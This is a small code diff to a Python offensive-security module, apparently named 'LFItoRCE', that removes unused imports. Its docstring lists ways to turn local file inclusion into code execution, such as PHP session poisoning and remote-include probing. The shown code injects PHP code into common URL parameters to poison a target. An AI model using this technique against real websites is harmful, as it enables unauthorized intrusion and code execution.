@@ -8,7 +8,6 @@ Methods:
 4. PHP session poisoning — inject into PHPSESSID file
 5. RFI probe — if LFI works, try remote include
 """
-import asyncio
 import base64
 import re
 import time
@@ -273,7 +272,7 @@ class LFItoRCE:
         poison_params = ["username", "user", "name", "email", "search", "q", "comment"]
         for pp in poison_params:
             try:
-                from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+                from urllib.parse import urlparse, urlencode, urlunparse
                 parts = urlparse(base_url)
                 poison_url = urlunparse((parts.scheme, parts.netloc, parts.path,
                                          urlencode([(pp, php_code)]), parts.fragment))
